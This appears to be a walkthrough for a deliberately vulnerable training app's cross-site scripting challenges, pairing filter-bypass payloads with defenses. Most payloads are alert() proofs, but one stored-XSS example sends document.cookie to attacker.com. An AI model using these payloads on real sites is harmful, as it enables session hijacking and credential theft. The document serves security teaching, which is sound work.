# Cross-Site Scripting

OWASP: https://owasp.org/Top10/2025/A05_2025-Injection/
CWE: CWE-79

Cross-site scripting (XSS) occurs when an application includes untrusted data in web pages without proper encoding or sanitization. Attackers inject client-side scripts that execute in other users' browsers, enabling session hijacking, defacement, and credential theft.

---

## Alert('Ship It!') (`xss_reflected`)

**Difficulty:** Intern
**CWE:** CWE-79
**Route:** `GET /challenges/xss?q=<payload>`

### Intern Tier

**Vulnerability:** User input from the `q` parameter is reflected directly into the page HTML using Jinja2's `|safe` filter, which disables autoescaping. No sanitization is applied.

```jinja2
<p class="greeting">Welcome, {{ result.output | safe }}!</p>
```

**Exploit:**

1. Navigate to `/challenges/xss`
2. Enter the following in the search box:

```html
<script>alert('XSS')</script>
```

3. The script tag is rendered as HTML and executes in the browser.

Alternative payloads:

```html
<img src=x onerror="alert('XSS')">
<svg onload=alert('XSS')>
```

**Solve condition:** The challenge solves when the `q` parameter contains any of: `<script`, `onerror`, `onload`, `onmouseover`, `javascript:`, `onfocus`.

**Why it works:** The `|safe` filter tells Jinja2 to skip HTML encoding. The browser interprets the injected markup as part of the page, executing any embedded JavaScript.

### Junior Tier

**What changed:** Two blacklist filters are applied:

1. **Tag blacklist** (case-insensitive): strips `<script>`, `<iframe>`, `<object>`, and `<embed>` tags.
2. **Event handler blacklist** (case-insensitive): replaces `onerror=`, `onload=`, `onclick=`, `onmouseover=`, `onfocus=`, `onblur=`, and `onchange=` with `blocked=`.

**Bypass:** The tag blacklist misses many HTML elements that accept event handlers: `<svg>`, `<details>`, `<math>`, `<video>`, `<audio>`, `<marquee>`, `<body>`, `<input>`. The event handler blacklist misses uncommon handlers like `ontoggle`, `onanimationend`, `onpointerover`, `oncontextmenu`, `ondrag`, `onpaste`, etc.

**Exploit:**

```html
<svg ontoggle="alert('XSS')">
```

or:

```html
<details open ontoggle="alert('XSS')">test</details>
```

or with mixed-case event on an unblocked tag:

```html
<math><mtext><img src=x oNerRor="alert('XSS')"></mtext></math>
```

The `<svg>` and `<details>` tags are not in the blocked list, and `ontoggle` is not in the event handler blacklist. The combination bypasses both filters.

### Senior Tier

**What changed:** HTML entity encoding is applied via `html.escape()`. However, the encoded output is placed inside a JavaScript string context in a `<script>` block using `|safe`:

```jinja2
<script>
    var username = '{{ result.output | safe }}';
</script>
```

**Bypass:** Break out of the JavaScript string literal. HTML entities do not protect against JavaScript context injection.

**Exploit:**

```
'; alert('XSS'); //
```

This closes the string with `'`, terminates the statement with `;`, executes `alert()`, and comments out the rest with `//`. To match the solve detection pattern, include a recognized keyword:

```html
';<script>alert('XSS')</script>//
```

### Tech Lead Tier

**Defense:** Three-layer protection:

1. **Bleach allowlist sanitization:** Only permits `<b>`, `<i>`, `<em>`, `<strong>`, `<a>`, `<p>`, `<br>` tags. All other tags and attributes are stripped.
2. **Jinja2 autoescaping:** Output rendered without `|safe`, so any remaining special characters are HTML-encoded.
3. **Content Security Policy:** `script-src 'self'` prevents inline script execution even if injection occurs.

**Why it works:** The allowlist approach ensures only known-safe HTML passes through. Autoescaping provides defense-in-depth. CSP acts as a final safety net, blocking execution of injected scripts. This addresses CWE-79 through output encoding, input sanitization, and browser-enforced policy.

---

## Toxic Code Review (`xss_stored`)

**Difficulty:** Junior
**CWE:** CWE-79
**Route:** `POST /blog/<post_id>/comments` (comment body)

### Intern Tier

**Vulnerability:** Blog comments are stored in the database as-is and rendered with Jinja2's `|safe` filter. No sanitization on input or output.

**Exploit:**

1. Navigate to any blog post
2. Submit a comment with the following body:

```html
<script>alert('XSS')</script>
```

3. The comment is stored and rendered as HTML whenever anyone views the blog post. The script executes for every visitor.

Alternative payloads:

```html
<img src=x onerror="alert(document.cookie)">
<svg onload="fetch('https://attacker.com/steal?c='+document.cookie)">
```

**Solve condition:** The challenge solves when the comment content contains any of: `<script`, `onerror`, `onload`, `onmouseover`, `javascript:`, `onfocus`, `<img`, `<svg`.

**Why it works:** Stored XSS is more dangerous than reflected XSS because the payload persists. Every user who views the page is affected, not just those who click a crafted link.

### Junior Tier

**What changed:** Comments are filtered through the same blacklist as reflected XSS: `<script>`, `<iframe>`, `<object>`, `<embed>` tags are stripped, and common event handlers (`onerror`, `onload`, `onclick`, `onmouseover`, `onfocus`, `onblur`, `onchange`) are replaced with `blocked=`. However, the filtered content is still rendered with `|safe`.

**Bypass:** Use tags and event handlers not covered by the blacklist.

**Exploit:**

```html
<details open ontoggle="alert('XSS')">click</details>
```

or:

```html
<svg onpointerover="alert('XSS')">hover me</svg>
```

### Senior Tier

**What changed:** A regex strips `<script>` tags (case-insensitive), but event handler attributes on other elements are not removed.

**Bypass:**

```html
<img src=x onerror="alert('XSS')">
```

The `<img>` tag is not in the blacklist. The `onerror` handler fires when the invalid `src` fails to load.

### Tech Lead Tier

**Defense:** Bleach sanitization with an empty tag allowlist strips all HTML tags and attributes. Comments are rendered as plain text.

**Why it works:** With no tags permitted, there is no way to inject executable HTML. CWE-79 is mitigated through strict output sanitization.

---

## Client-Side Deploys Only (`xss_dom`)

**Difficulty:** Senior
**CWE:** CWE-79
**Route:** `/challenges/xss/dom#<payload>`

### Intern Tier

**Vulnerability:** Client-side JavaScript reads from `window.location.hash` and writes the value directly into the page using `innerHTML`:

```javascript
output.innerHTML = 'Welcome, ' + name + '!';
```

**Exploit:**

1. Navigate to:

```
/challenges/xss/dom#<img src=x onerror="alert('XSS')">
```

2. The hash value is URL-decoded and inserted into the DOM via `innerHTML`. The `onerror` handler fires immediately.

Alternative payloads:

```
#<svg onload=alert('XSS')>
#<script>alert('XSS')</script>
```

Note: `<script>` tags inserted via `innerHTML` do not execute in modern browsers, but `<img onerror>` and `<svg onload>` do.

**Solve condition:** Client-side code detects XSS patterns in the hash and posts to `/challenges/xss/dom/solve`. Patterns: `<script`, `onerror`, `onload`, `javascript:`, `<img`, `<svg`.

**Why it works:** DOM-based XSS never touches the server. The vulnerability exists entirely in client-side JavaScript that reads from an attacker-controlled source (the URL hash) and writes to a dangerous sink (`innerHTML`).

### Junior Tier

**What changed:** Same as intern; `innerHTML` with no filtering.

**Exploit:** Same payloads as intern tier.

### Senior Tier

**What changed:** A client-side regex strips `<script>` tags (case-insensitive with `gi` flag), but still uses `innerHTML`.

**Bypass:**

```
#<img src=x onerror="alert('XSS')">
```

The script tag filter does not affect `<img>` or `<svg>` tags with event handlers.

### Tech Lead Tier

**Defense:** Uses `textContent` instead of `innerHTML`:

```javascript
output.textContent = 'Welcome, ' + name + '!';
```

**Why it works:** `textContent` treats all input as plain text. No HTML parsing occurs, so injected tags are displayed as literal text rather than being rendered. This addresses CWE-79 by using a safe DOM API that does not interpret HTML.
